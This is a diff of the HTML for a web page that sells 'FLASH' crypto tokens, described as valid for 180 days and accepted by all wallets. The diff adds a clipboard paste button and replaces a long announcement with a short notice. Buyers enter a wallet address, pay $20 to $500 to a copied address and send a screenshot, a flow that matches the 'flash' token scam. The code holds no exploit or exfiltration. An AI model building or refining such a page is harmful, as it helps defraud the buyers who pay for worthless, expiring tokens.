@@ -69,6 +69,19 @@
       box-sizing: border-box;
     }
 
+    .btn-paste {
+      background: rgba(255, 255, 255, 0.1);
+      border: 1px solid #FFD70044;
+      color: #FFD700;
+      border-radius: 10px;
+      padding: 8px;
+      margin-top: -5px;
+      margin-bottom: 10px;
+      cursor: pointer;
+      font-weight: bold;
+      width: 100%;
+    }
+
     .result {
       text-align: center;
     }
@@ -199,91 +212,13 @@
     }
   </style>
 </head>
-<body oncontextmenu="return false">
+<body>
 
   <!-- Popup -->
   <div id="popup-overlay">
     <div class="popup-box">
       <h2>📢 Important Notice</h2>
-      <p>
-      <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Flash Announcement</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f5f5f5;
-      color: #111;
-      padding: 20px;
-      max-width: 600px;
-      margin: auto;
-    }
-
-    h2 {
-      color: #007bff;
-    }
-
-    ul, ol {
-      margin: 0 0 15px 0;
-      padding-left: 20px;
-    }
-
-    ul li::marker {
-      color: green;
-    }
-
-    ol li::marker {
-      color: #007bff;
-    }
-
-    .section {
-      background: #ffffff;
-      border-radius: 10px;
-      padding: 20px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-      margin-bottom: 20px;
-    }
-  </style>
-</head>
-<body>
- ⚡️ FLASH Available Now!
-
-🔹 Flash Features:
-
-Tradable and Can be sent and received freely it also Convertible to other cryptocurrencies
-
-Accepted by all wallets and platforms: Binance, Bybit, Trust Wallet, MetaMask...
-
-Valid for 180 days
-
-
-
----
-
-🛠 How to Use the Bot:
-
-1. Enter your wallet address (network will be detected automatically)
-
-
-2. Choose the amount you want to pay (between $20 and $500)
-
-
-3. You’ll see the amount of FLASH you will receive
-
-
-4. Click Continue
-
-
-5. Copy the wallet address and send the required payment
-
-
-6. After payment, send us a screenshot
-
-
-7. Your FLASH tokens will be delivered automatically  </p>
+      <p>FLASH is valid for 180 days. Make sure your wallet is compatible and has at least 0.00001 BNB/TRX/ETH.</p>
       <button onclick="closePopup()">OK</button>
     </div>
   </div>
@@ -296,7 +231,8 @@ Valid for 180 days
     </div>
 
     <div class="glass-box">
-      <input type="text" id="wallet" placeholder="Enter wallet address" oninput="detectNetwork()" />
+      <input type="text" id="wallet" placeholder="Enter wallet address" oninput="detectNetwork()" onpaste="return true" />
+      
 
       <div class="network-buttons">
         <div id="bep" class="network-btn"><img src="bep.png" alt="BEP20" /></div>
@@ -336,6 +272,14 @@ Valid for 180 days
         document.getElementById("bep").classList.add("active");
         document.getElementById("erc").classList.add("active");
       }
+    }
+
+    function pasteAddress() {
+      navigator.clipboard.readText().then(text => {
+        document.getElementById("wallet").value = text;
+        detectNetwork();
+        alert("✅ Address pasted");
+      });
     }
 
     function calculateFlash() {
